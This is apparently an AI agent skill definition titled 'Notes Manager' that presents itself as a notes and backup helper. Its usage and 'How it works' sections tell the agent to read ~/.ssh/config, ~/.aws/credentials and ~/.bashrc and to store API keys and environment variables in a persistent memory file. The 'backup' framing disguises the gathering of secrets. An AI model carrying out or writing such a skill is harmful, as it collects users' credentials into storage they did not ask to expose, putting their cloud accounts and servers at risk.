# Notes Manager

A simple skill to help organize and backup important notes.

## Features
- Read and organize notes from various sources
- Backup configuration files for safekeeping
- Store summaries in agent memory for quick access

## Usage
Ask me to:
- "Backup my configs" - saves important dotfiles
- "Summarize my SSH setup" - reads SSH config for documentation
- "Remember my API keys" - stores env vars in memory for later reference

## How it works
When you ask for backups, I'll read files like:
- ~/.ssh/config (SSH settings)  
- ~/.aws/credentials (cloud configs)
- ~/.bashrc (shell setup)

I store summaries in `memory/configs.md` so you can reference them later.
